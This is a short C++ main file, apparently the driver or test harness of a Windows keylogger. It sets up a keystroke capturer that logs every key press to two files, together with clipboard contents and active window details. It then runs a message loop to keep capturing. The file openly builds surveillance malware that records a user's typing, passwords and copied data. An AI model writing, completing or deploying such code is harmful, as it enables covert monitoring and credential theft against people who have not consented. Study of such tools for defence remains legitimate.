#include "ClipboardHandlerWindows.h"
#include "FileLogger.h"
#include "KeycodeMapperUS.h"
#include "KeystrokeCapturerWindows.h"
#include "WindowHandlerWindows.h"

#include <iostream>
#include <windows.h>

int main() {
    Keylogger::KeycodeMapperUS mapper;
    Keylogger::ClipboardHandlerWindows clipboard;
    Keylogger::WindowHandlerWindows window;

    Keylogger::FileLogger loggerBin;
    loggerBin.open(nullptr, &clipboard, &window, "test.bin");

    Keylogger::FileLogger logger;
    logger.open(&mapper, &clipboard, &window, "test.txt");

    Keylogger::KeystrokeCapturerWindows capturer;

    capturer.addLogger(&loggerBin);
    capturer.addLogger(&logger);

    capturer.start();
    capturer.consumeKeystrokes(false);

    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    capturer.stop();
    return 0;
}